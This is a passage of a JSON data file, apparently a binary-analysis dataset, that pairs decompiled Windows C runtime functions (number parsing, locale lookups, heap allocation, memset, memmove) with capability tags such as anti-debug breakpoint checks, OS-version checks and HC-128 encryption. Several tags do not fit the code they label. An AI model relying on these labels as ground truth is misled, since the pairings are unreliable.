        "decompiled_code": "\nint32_t fcn.00409627(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.00402306();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x45cdfc) {\n        iVar1 = fcn.00404d2d();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.0040a03e(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 440
    },
    "00409aaf": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00409aaf(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.00402306();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x45cdfc) {\n        iVar1 = fcn.00404d2d();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0040a03e(iVar1, param_1, 4);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 4;\n}\n",
        "token_count": 158
    },
    "00409cdc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_1ch_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00409cdc(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint arg_8h, \n            uint arg_ch, uint noname_8, uint noname_9, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h_00;\n    int32_t unaff_EBP;\n    uint Locale;\n    uint LCType;\n    uint lpLCData;\n    uint cchData;\n    uint var_34h;\n    uint uVar2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_1ch_2;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x40d828;\n    var_20h = 0x409ce8;\n    fcn.004026d8();\n    if (*0x45d7c8 == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x409d11;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x45d7c8 = 2;\n            }\n        }\n        else {\n            *0x45d7c8 = 1;\n        }\n    }\n    if (*0x45d7c8 == 1) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n    }\n    else if ((*0x45d7c8 == 2) || (*0x45d7c8 == 0)) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x24) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x45d6a0;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h_00 = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n        *(unaff_EBP + -0x20) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00402830();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h_00 = fcn.0040162a(*(unaff_EBP + -0x20));\n                if (arg_8h_00 == NULL) goto code_r0x00409e03;\n                *(unaff_EBP + -0x24) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)\n                              (*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h_00, *(unaff_EBP + -0x20));\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    var_28h = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    var_28h = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 0x18), 1, arg_8h_00, 0xffffffff, uVar2, var_28h);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            if (*(unaff_EBP + -0x24) != 0) {\n                fcn.00401512(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00409e03:\n    *(unaff_EBP + -0x38) = 0x409e0b;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 1261
    },
    "00409e0c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00409e0c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint Locale, \n            uint LCType, uint lpLCData, uint cchData, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_4h;\n    uint uVar2;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_34h;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x40d838;\n    var_20h = 0x409e18;\n    fcn.004026d8();\n    if (*0x45d7cc == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x409e41;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x45d7cc = 2;\n            }\n        }\n        else {\n            *0x45d7cc = 1;\n        }\n    }\n    if ((*0x45d7cc == 2) || (*0x45d7cc == 0)) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n    }\n    else if (*0x45d7cc == 1) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x45d6a0;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        *(unaff_EBP + -0x24) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00402830();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h = fcn.0040162a(iVar1 * 2);\n                if (arg_8h == NULL) goto code_r0x00409f43;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h, iVar1);\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    uVar3 = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    uVar3 = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x18), 0, arg_8h, 0xffffffff, uVar2, uVar3, 0, 0);\n                *(unaff_EBP + -0x1c) = uVar3;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00401512(arg_8h);\n            }\n        }\n    }\ncode_r0x00409f43:\n    *(unaff_EBP + -0x38) = 0x409f4b;\n    fcn.00402713();\n    return;\n}\n",
        "token_count": 1212
    },
    "00402602": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.00402602(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x45da40 = (*_sym.imp.KERNEL32.dll_HeapCreate)(param_1 == 0, 0x1000, 0);\n    if (*0x45da40 == 0) {\n        return 0;\n    }\n    *0x45da44 = fcn.004025e8();\n    if ((*0x45da44 == 3) && (iVar1 = fcn.00402a1e(0x3f8),  iVar1 == 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapDestroy)(*0x45da40);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 168
    },
    "00404968": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404968(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004026d8(0x40bf10, 0x10);\n    uVar2 = *(unaff_EBP + 8);\n    if ((uVar2 != 0) && (0xffffffe0 / uVar2 < *(unaff_EBP + 0xc))) {\ncode_r0x00404a39:\n        fcn.00402713();\n        return;\n    }\n    uVar2 = uVar2 * *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x20) = uVar2;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    do {\n        iVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        if (uVar2 < 0xffffffe1) {\n            if (*0x45da44 == 3) {\n                uVar2 = uVar2 + 0xf & 0xfffffff0;\n                *(unaff_EBP + 0xc) = uVar2;\n                arg_8h_00 = *(unaff_EBP + -0x20);\n                if (*0x45da30 < arg_8h_00) goto code_r0x004049f6;\n                fcn.004029d8(4);\n                *(unaff_EBP + -4) = 0;\n                uVar1 = fcn.0040368a(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar1;\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00404a2e();\n                iVar3 = *(unaff_EBP + -0x1c);\n                if (iVar3 != 0) {\n                    fcn.00401230(iVar3, 0, *(unaff_EBP + -0x20));\n                    goto code_r0x004049f6;\n                }\n            }\n            else {\ncode_r0x004049f6:\n                if (iVar3 != 0) goto code_r0x00404a39;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45da40, 8, uVar2);\n        }\n        if (((iVar3 != 0) || (*0x45d60c == 0)) || (iVar3 = fcn.004039b0(uVar2),  iVar3 == 0)) goto code_r0x00404a39;\n    } while( true );\n}\n",
        "token_count": 657
    },
    "00405c4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00405c4d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004026d8(0x40c118, 0x14);\n    arg_ch_00 = *(unaff_EBP + 8);\n    if (arg_ch_00 == 0) {\n        fcn.0040162a(*(unaff_EBP + 0xc));\n    }\n    else {\n        arg_10h = *(unaff_EBP + 0xc);\n        if (arg_10h == 0) {\n            fcn.00401512(arg_ch_00);\n        }\n        else if (*0x45da44 == 3) {\n            do {\n                *(unaff_EBP + -0x1c) = 0;\n                if (0xffffffe0 < arg_10h) goto code_r0x00405df0;\n                fcn.004029d8(4);\n                *(unaff_EBP + -4) = 0;\n                iVar1 = fcn.00402a66(arg_ch_00);\n                *(unaff_EBP + -0x20) = iVar1;\n                if (iVar1 != 0) {\n                    if (arg_10h <= *0x45da30) {\n                        iVar1 = fcn.00402f66(iVar1, arg_ch_00, arg_10h);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.0040368a(arg_10h);\n                            *(unaff_EBP + -0x1c) = iVar1;\n                            if (iVar1 != 0) {\n                                uVar2 = *(arg_ch_00 + -4) - 1;\n                                *(unaff_EBP + -0x24) = uVar2;\n                                if (arg_10h <= uVar2) {\n                                    uVar2 = arg_10h;\n                                }\n                                fcn.00404590(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                uVar3 = fcn.00402a66(arg_ch_00);\n                                *(unaff_EBP + -0x20) = uVar3;\n                                fcn.00402a91(uVar3, arg_ch_00);\n                            }\n                        }\n                        else {\n                            *(unaff_EBP + -0x1c) = arg_ch_00;\n                        }\n                    }\n                    if (*(unaff_EBP + -0x1c) == 0) {\n                        if (arg_10h == 0) {\n                            arg_10h = 1;\n                            *(unaff_EBP + 0xc) = 1;\n                        }\n                        arg_10h = arg_10h + 0xf & 0xfffffff0;\n                        *(unaff_EBP + 0xc) = arg_10h;\n                        iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x45da40, 0, arg_10h);\n                        *(unaff_EBP + -0x1c) = iVar1;\n                        if (iVar1 != 0) {\n                            uVar2 = *(arg_ch_00 + -4) - 1;\n                            *(unaff_EBP + -0x24) = uVar2;\n                            if (arg_10h <= uVar2) {\n                                uVar2 = arg_10h;\n                            }\n                            fcn.00404590(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                            fcn.00402a91(*(unaff_EBP + -0x20), arg_ch_00);\n                        }\n                    }\n                }\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00405db5();\n                if (*(unaff_EBP + -0x20) == 0) {\n                    if (arg_10h == 0) {\n                        arg_10h = 1;\n                    }\n                    arg_10h = arg_10h + 0xf & 0xfffffff0;\n                    *(unaff_EBP + 0xc) = arg_10h;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x45da40, 0, arg_ch_00, arg_10h);\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n            } while (((*(unaff_EBP + -0x1c) == 0) && (*0x45d60c != 0)) && (iVar1 = fcn.004039b0(arg_10h),  iVar1 != 0));\n        }\n        else {\n            do {\n                if (0xffffffe0 < arg_10h) goto code_r0x00405df0;\n                if (arg_10h == 0) {\n                    arg_10h = 1;\n                }\n                iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x45da40, 0, arg_ch_00, arg_10h);\n            } while (((iVar1 == 0) && (*0x45d60c != 0)) && (iVar1 = fcn.004039b0(arg_10h),  iVar1 != 0));\n        }\n    }\ncode_r0x00405df9:\n    fcn.00402713();\n    return;\ncode_r0x00405df0:\n    fcn.004039b0(arg_10h);\n    goto code_r0x00405df9;\n}\n",
        "token_count": 1311
    },
    "00401140": {
        "rules": [
            "encrypt data using HC-128/11bb23636d2a4650a9dbaa6512d69580"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401140(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.004010d0(arg_8h);\n    *(iVar1 + 0x1000 + (arg_ch & 0xfff)) = arg_10h;\n    uVar2 = (arg_ch >> 6 | arg_ch << 0x1a) + 0xbc71;\n    uVar2 = (uVar2 * 0x400000 | uVar2 >> 10) ^ arg_10h;\n    *(iVar1 + 8) = (uVar2 << (arg_10h & 0x1f) | uVar2 >> (0x20 - (arg_10h & 0x1f) & 0x1f)) + arg_10h;\n    *(iVar1 + 0xc) = arg_10h;\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "00401230": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t * fcn.00401230(uint32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    uVar1 = param_2;\n    puVar4 = param_1;\n    if (3 < param_3) {\n        uVar2 = -param_1 & 3;\n        uVar3 = param_3;\n        if (uVar2 != 0) {\n            uVar3 = param_3 - uVar2;\n            do {\n                *puVar4 = param_2;\n                puVar4 = puVar4 + 1;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar1 = uVar1 * 0x1010101;\n        param_3 = uVar3 & 3;\n        uVar3 = uVar3 >> 2;\n        if (uVar3 != 0) {\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            if (param_3 == 0) {\n                return param_1;\n            }\n        }\n    }\n    do {\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        param_3 = param_3 - 1;\n    } while (param_3 != 0);\n    return param_1;\n}\n",
        "token_count": 386
    },
    "00404590": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00404590(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00404754;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x404878\n            switch(*((arg_10h & 3) * 4 + 0x404878)) {\n            case 0x404890:\ncode_r0x00404890:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x4048a0:\ncode_r0x004048a0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x4048b4:\ncode_r0x004048b4:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x404878\n            switch(*(arg_10h * 4 + 0x404878)) {\n            case 0x404890:\n                goto code_r0x00404890;\n            case 0x4048a0:\n                goto code_r0x004048a0;\n            case 0x4048b4:\n                goto code_r0x004048b4;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x40477c)) {\n            case 0x40478c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00404754:\n    // WARNING: Could not recover jumptable at 0x00404756. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x404828\n                    puVar1 = (**(uVar3 * -4 + 0x404828))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x404878)) {\n                case 0x404890:\n                    goto code_r0x00404890;\n                case 0x4048a0:\n                    goto code_r0x004048a0;\n                case 0x4048b4:\n                    goto code_r0x004048b4;\n                }\n                break;\n            case 0x4047b0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x00404754;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x404878)) {\n                case 0x404890:\n                    goto code_r0x00404890;\n                case 0x4048a0:\n                    goto code_r0x004048a0;\n                case 0x4048b4:\n                    goto code_r0x004048b4;\n                }\n                break;\n            case 0x4047d8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x00404754;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x404878)) {\n                case 0x404890:\n                    goto code_r0x00404890;\n                case 0x4048a0:\n                    goto code_r0x004048a0;\n                case 0x4048b4:\n                    goto code_r0x004048b4;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x004045ec;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x4046dc\n        switch(*((arg_10h & 3) * 4 + 0x4046dc)) {\n        case 0x4046f4:\ncode_r0x004046f4:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x404700:\ncode_r0x00404700:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x404714:\ncode_r0x00404714:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x4046ec)) {\n        case 0x4046f4:\n            goto code_r0x004046f4;\n        case 0x404700:\n            goto code_r0x00404700;\n        case 0x404714:\n            goto code_r0x00404714;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x4045f0)) {\n        case 0x404600:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x004045ec:\n    // WARNING: Could not recover jumptable at 0x004045ec. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x404670\n                puVar1 = (**(uVar2 * 4 + 0x404670))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4046dc)) {\n            case 0x4046f4:\n                goto code_r0x004046f4;\n            case 0x404700:\n                goto code_r0x00404700;\n            case 0x404714:\n                goto code_r0x00404714;\n            }\n            break;\n        case 0x40462c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x004045ec;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4046dc)) {\n            case 0x4046f4:\n                goto code_r0x004046f4;\n            case 0x404700:\n                goto code_r0x00404700;\n            case 0x404714:\n                goto code_r0x00404714;\n            }\n            break;\n        case 0x404650:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x004045ec;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x4046dc)) {\n            case 0x4046f4:\n                goto code_r0x004046f4;\n            case 0x404700:\n                goto code_r0x00404700;\n            case 0x404714:\n                goto code_r0x00404714;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2653
    },
    "00405910": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00405910(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x00405ad4;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x405bf8\n            switch(*((arg_10h & 3) * 4 + 0x405bf8)) {\n            case 0x405c10:\ncode_r0x00405c10:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x405c20:\ncode_r0x00405c20:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x405c34:\ncode_r0x00405c34:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x405bf8\n            switch(*(arg_10h * 4 + 0x405bf8)) {\n            case 0x405c10:\n                goto code_r0x00405c10;\n            case 0x405c20:\n                goto code_r0x00405c20;\n            case 0x405c34:\n                goto code_r0x00405c34;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x405afc)) {\n            case 0x405b0c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x00405ad4:\n    // WARNING: Could not recover jumptable at 0x00405ad6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x405ba8\n                    puVar1 = (**(uVar3 * -4 + 0x405ba8))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = 